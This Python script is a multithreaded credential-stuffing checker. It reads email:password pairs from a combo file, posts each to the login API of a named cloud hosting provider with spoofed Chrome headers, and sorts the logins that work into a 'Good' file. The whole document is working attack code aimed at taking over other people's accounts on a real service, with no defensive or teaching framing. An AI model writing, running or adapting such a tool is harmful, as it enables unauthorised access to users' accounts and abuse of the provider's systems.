import requests
import json
import concurrent.futures

Good = open("Good.txt", "a")
Bad = open("Bad.txt", "a")
Time_out = open("Time_out.txt", "w")
exception = open("Exception.txt", "w")

class colors:
  LGREEN = '\033[38;2;129;199;116m'
  LBLUE = '\033[38;5;111m'
  LRED = '\033[38;2;239;83;80m'
  LPURPLE = '\033[38;2;148;73;209m'
  RESET = '\u001B[0m'
  LXC = '\033[38;2;255;152;0m'
  GREY = '\033[38;2;158;158;158m'
  LYELLOW = '\033[38;2;255;255;0m'
  LLIME = '\033[38;2;0;255;0m'

def Login(credential):
    try:
        is_bad=False
        credential=credential
        Email=credential.split(":")[0]
        Pass=credential.split(":")[1]
        # Define the payload data as JSON
        payload = {
            "email": Email,
            "password": Pass,
        }

        # Define the headers for the POST request
        headers = {
            "Connection": "keep-alive",
            "sec-ch-ua": "\"Google Chrome\";v=\"119\", \"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"",
            "DNT": "1",
            "sec-ch-ua-mobile": "?0",
            "Authorization": "false",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "sec-ch-ua-platform": "Windows",
            "Origin": "https://panel.virakcloud.com",
            "Sec-Fetch-Site": "same-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://panel.virakcloud.com/",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate"
        }

        # Send a POST request to the specified URL with the headers and payload data
        response = requests.post("https://api.virakcloud.com/api/v1/login", headers=headers, json=payload, timeout=30)

        # Check the response status and print the result
        if response.status_code == 201:
            print(f"{colors.GREY}=> {colors.RESET} {colors.LGREEN} successful : {credential}{colors.RESET} ")
            Good.write(f"{credential}\n")
            Good.flush()
        else:
            is_bad=True
    except requests.exceptions.Timeout:
        print(f"{colors.LBLUE}=>  TimeOut : {credential} {e} {colors.RESET} ")
        Time_out.write(credential+"\n")
        Time_out.flush()

    except requests.exceptions.RequestException as e:
        print(f"{colors.LPURPLE}=>  Exception : {credential} {e} {colors.RESET} ")
        exception.write(f"{credential} : {e}\n")
        exception.flush()

    finally:
        if is_bad == True:
            print(f"{colors.GREY}=> {colors.RESET} {colors.LRED} Failed : {credential} {colors.RESET} ")
            Bad.write(credential+"\n")
            Bad.flush()  

def main():
    ip_file = "combo.txt"
    with open(ip_file, "r") as combo1:
        combo= combo1.readlines()
    Worker= input("How many threads do you want ? ")
    with concurrent.futures.ThreadPoolExecutor(
        max_workers=int(Worker)) as executor:  #Adjust max_workers as needed
        executor.map(Login,combo)


if __name__ == "__main__":
  main()
